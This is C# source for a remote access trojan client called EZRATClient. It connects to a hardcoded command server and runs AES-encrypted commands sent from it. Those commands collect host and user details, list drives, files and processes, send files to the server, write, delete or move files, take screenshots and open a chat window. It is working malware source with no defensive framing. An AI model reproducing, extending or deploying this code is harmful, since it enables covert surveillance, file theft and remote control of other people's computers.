using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Security.Cryptography;
using EZRATClient.Utils;
using EZRATClient.Forms;
using System.Diagnostics;
using System.Drawing.Imaging;

namespace EZRATClient
{
    public class Program
    {



        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;


        static string _ip = "192.168.1.112";
        static int _port = 1234;

        public static string Ip { get => _ip; set => _ip = value; }
        public static int Port { get => _port; set => _port = value; }

        private static TcpClient client = new TcpClient();
        private static bool connectedBefore = false;
        private static Thread TConnect;
        private static Socket _clientSocket = new Socket
            (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        private static bool _isDiconnect;
        private static bool isFileDownload;
        private static string EncryptKey = "POULPE212123542345235";

        public static bool isDisconnect
        {
            get { return _isDiconnect; }
            set { _isDiconnect = value; }
        }

        private static Chat cht = null;

        private static Thread TChat;


        #region Variables
        private static String fup_location = "";
        private static int fup_size = 0;
        private static int writeSize = 0;
        private static byte[] recvFile = new byte[1];
        private static String fdl_location = "";
        private static bool isKlThreadRunning = false;
        private const bool applicationHidden = false;
        private static string getScreens; //get screens count
        public static int ScreenNumber = 0;
        public static bool IsLinuxServer = false;
        public static Encoding encoder;
        public static string LocalIPCache = string.Empty;
        public static string LocalAVCache = string.Empty;
        #endregion



        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.ProcessExit += new EventHandler(CurrentDomain_ProcessExit);
            IntPtr handle = GetConsoleWindow();
            ShowWindow(handle, SW_SHOW);

            try
            {
                ConnectToServer();
                RequestLoop();
            }
            catch (SocketException ex)
            {
                if (!client.Connected && connectedBefore == true)
                {
                    Console.WriteLine("Disconnected");
                }
            }


        }

        static void CurrentDomain_ProcessExit(object sender, EventArgs e)
        {
            _clientSocket.Close();
        }

        public static string Encrypt(string clearText)
        {
            try
            {
                string EncryptionKey = EncryptKey; //Encryption key
                byte[] clearBytes = Encoding.Default.GetBytes(clearText); //Bytes of the message
                using (Aes encryptor = Aes.Create()) //Create a new AES decryptor
                {
                    //Encrypt the data
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);

                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(clearBytes, 0, clearBytes.Length);
                            cs.Close();
                        }
                        clearText = Convert.ToBase64String(ms.ToArray());
                    }
                }
                return clearText; //Return the encrypted text
            }
            catch (Exception) //Something went wrong
            {
                return clearText; //Send the plain text data
            }
        }

        /// <summary>
        /// Decrypt encrypted data
        /// </summary>
        /// <param name="cipherText">The data to decrypt</param>
        /// <returns>The plain text message</returns>
        public static string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = EncryptKey; //this is the secret encryption key  you want to hide dont show it to other guys
                byte[] cipherBytes = Convert.FromBase64String(cipherText); //Get the encrypted message's bytes
                using (Aes encryptor = Aes.Create()) //Create a new AES object
                {
                    //Decrypt the text
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Default.GetString(ms.ToArray());
                    }
                }
                return cipherText; //Return the plain text data
            }
            catch (Exception ex) //Something went wrong
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine("Cipher Text: " + cipherText);
                return "error"; //Return error
            }
        }


        private static void RequestLoop()
        {
            while (true) //While the connection is alive
            {
                //SendRequest();
                if (!_clientSocket.Connected) break; //If we need to disconnect, then break out
                ReceiveResponse(); // Receive data from the server
            }

            Console.WriteLine("Connection Ended"); //Disconnected at this point
            //Shutdown the client, then reconnect to the server
            //_clientSocket.Shutdown(SocketShutdown.Both);
            //_clientSocket.Close();
            _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            ConnectToServer();
            isDisconnect = false;
            RequestLoop();
        }

        private static void HandleCommand(string text)
        {
            if (text.StartsWith("getinfo-"))// i added this to start task manager
            {

                string response = "infoback;";
                response += text.Substring(8);
                response += ";";
                response += SystemInfo.GetLocalIPAddress();
                response += "¦";
                response += SystemInfo.GetMachineName();
                response += "¦";
                response += SystemInfo.GetUserName();
                response += "¦";
                response += SystemInfo.GetWindowsVersion();

                SendCommand(response);

            }
            else if (text == "dc") { _clientSocket.Shutdown(SocketShutdown.Both); _clientSocket.Close(); ConnectToServer(); }
            else if (text == "lsdrives")
            {
                string response = "lsdrives;";
                string[] drives = SystemInfo.GetDrives();
                for (int i = 0; i < drives.Length; i += 1)
                {
                    response += drives[i];
                    response += "¦";
                }

                SendCommand(response);
            }
            else if (text.StartsWith("lsfiles-"))
            {
                string path = text.Substring(8);
                DirectoryInfo d = new DirectoryInfo(path);
                List<DirectoryInfo> resD = new List<DirectoryInfo>();
                List<FileInfo> resF = new List<FileInfo>();

                try
                {
                    resD = d.EnumerateDirectories("*", SearchOption.TopDirectoryOnly)
             .Where(fi => (fi.Attributes & FileAttributes.Normal) == 0).ToList();

                    resF = d.EnumerateFiles("*", SearchOption.TopDirectoryOnly)
                 .Where(fi => (fi.Attributes & FileAttributes.Normal) == 0).ToList();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }


                string response = "lsfiles;";
                response += path;
                response += ";";
                resD.ForEach((item) =>
                {
                    response += item.Name; // Tarte.cs
                    response += "¦";  // Tarte.cs¦
                    response += "2";  // Tarte.cs¦2
                    response += "|";  // Tarte.cs¦2|
                });
                resF.ForEach((item) =>
                {
                    response += item.Name; // Tarte.cs
                    response += "¦";  // Tarte.cs¦
                    response += "1";  // Tarte.cs¦1
                    response += "|";  // Tarte.cs¦1|
                });

                SendCommand(response);
            }
            else if (text.StartsWith("chat;"))
            {
                string options = text.Substring(5);
                string[] tmp = options.Split(';');
                string msg;

                msg = tmp[0];
                if (cht == null)
                {
                    cht = new Chat(msg);
                    TChat = new Thread(() => cht.ShowDialog());
                    TChat.Start();
                }
                else
                {
                    cht.NewMessage(msg);
                }


            }
            else if (text.StartsWith("chatdata;"))
            {
                if (cht != null)
                {
                    SendCommand("chatdata;" + String.Join("¦", cht.Texted));
                }
            }
            else if (text.StartsWith("dlfile;"))
            {
                string path = text.Substring(7);
                SendFile(path);

            }
            else if (text.StartsWith("upfile;"))
            {
                text = text.Substring(7);
                string[] lines = text.Split(';');
                string path = lines[0];
                byte[] recFile = Encoding.Default.GetBytes(lines[1]);
                ReceiveFile(recFile, path);
            }
            else if (text.StartsWith("dtfile;"))
            {
                text = text.Substring(7);
                File.Delete(text);
            }
            else if (text.StartsWith("rmfile;"))
            {
                text = text.Substring(7);
                string[] lines = text.Split(';');
                string src = lines[0];
                string dst = lines[1];
                File.Move(src, dst);
            }
            else if (text.StartsWith("procview;"))
            {
                Process[] proc = Process.GetProcesses();
                string result = "procview;";
                for (int i = 0; i < proc.Length; i++)
                {
                    result += $"{proc[i].ProcessName}¦{proc[i].Id};";
                }
                SendCommand(result);
            }else if(text == "scrnshot;")
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    ScreenUtils.ScreenShot().Save(ms, ImageFormat.Png);
                    string result = "scrnshot;" + Encoding.Default.GetString(ms.ToArray());
                    SendCommand(result);
                }
            }
        }

        private static void ReceiveFile(byte[] data, string path)
        {
            File.WriteAllBytes(path, data);
        }





        private static string[] GetCommands(string rawData)
        {
            List<string> commands = new List<string>(); //The command sent by the server
            int readBack = 0; //How much to read back from the current char pointer

            for (int i = 0; i < rawData.Length; i++) // Go through the message
            {
                char current = rawData[i]; //Get the current character
                if (current == '§') //If we see this char -> message delimiter
                {
                    int dataLength = int.Parse(rawData.Substring(readBack, i - readBack)); //Get the length of the command string
                    string command = rawData.Substring(i + 1, dataLength); //Get the command string itself
                    i += 1 + dataLength; //Skip the current command
                    readBack = i; //Set the read back point to here
                    commands.Add(command); //Add this command to the list
                }
            }

            return commands.ToArray(); //Return the command found
        }


        private static void ReceiveResponse()
        {

            byte[] buffer = new byte[4096]; //The receive buffer

            try
            {
                int received = 0;
                received = _clientSocket.Receive(buffer, SocketFlags.None); //Receive data from the server
                if (received == 0) return; //If failed to received data return
                byte[] data = new byte[received]; //Create a new buffer with the exact data size
                Array.Copy(buffer, data, received); //Copy from the receive to the exact size buffer
                if (isFileDownload) //File download is in progress
                {
                    Buffer.BlockCopy(data, 0, recvFile, writeSize, data.Length); //Copy the file data to memory

                    writeSize += data.Length; //Increment the received file size

                    if (writeSize == fup_size) //prev. recvFile.Length == fup_size
                    {
                        //Console.WriteLine("Create File " + recvFile.Length);

                        using (FileStream fs = File.Create(fup_location))
                        {
                            byte[] info = recvFile;
                            // Add some information to the file.
                            fs.Write(info, 0, info.Length);
                        }

                        Array.Clear(recvFile, 0, recvFile.Length);
                        SendCommand("frecv");
                        writeSize = 0;
                        isFileDownload = false;
                    }
                }
                else //Not downloading files
                {
                    string text = Encoding.Default.GetString(data); //Convert the data to unicode string
                    Console.WriteLine(text);
                    string[] commands = GetCommands(text); //Get command of the message

                    //Console.WriteLine(text);

                    foreach (string cmd in commands) //Loop through the commands
                    {
                        HandleCommand(Decrypt(cmd)); //Decrypt and execute the command
                    }
                }
            }
            catch (Exception ex) //Somethind went wrong
            {
                Console.WriteLine($"Connection ended\n{ex.Message}");
                isDisconnect = true;
            }
        }

        public static void SendFile(string path)
        {
            if (!_clientSocket.Connected) //If the client isn't connected
            {
                Console.WriteLine("Socket is not connected!");
                return; //Return
            }


            try
            {
                //_clientSocket.SendFile(path); //Send the data to the server
                byte[] result = Encoding.Default.GetBytes(Encrypt("dlfile;" + File.ReadAllText(path)));
                _clientSocket.Send(result);
            }
            catch (Exception ex) //Failed to send data to the server
            {
                Console.WriteLine("Send File Failure " + ex.Message);
                return; //Return
            }
        }
        public static void SendCommand(string response)
        {
            if (!_clientSocket.Connected) //If the client isn't connected
            {
                Console.WriteLine("Socket is not connected!");
                return; //Return
            }
            response = Encrypt(response);
            byte[] data = Encoding.Default.GetBytes(response); //Get the bytes of the encrypted data

            try
            {
                _clientSocket.Send(data); //Send the data to the server

            }
            catch (Exception ex) //Failed to send data to the server
            {
                Console.WriteLine("Send Command Failure " + ex.Message);
                return; //Return
            }
        }


        private static void ConnectToServer()
        {
            int attempts = 0; //Connection attempts to the server

            while (!_clientSocket.Connected) //Connect while the client isn't connected
            {
                try
                {
                    attempts++; //1 more attempt
                    Console.WriteLine("Connection attempt " + attempts);


                    _clientSocket.Connect(IPAddress.Parse(Ip), Port); //Try to connect to the server
                    Thread.Sleep(500);
                }
                catch (SocketException) //Couldn't connect to server
                {

                    Console.Clear();
                }
            }

            Console.Clear();
            Console.WriteLine("Connected"); //Client connected
        }

    }




}
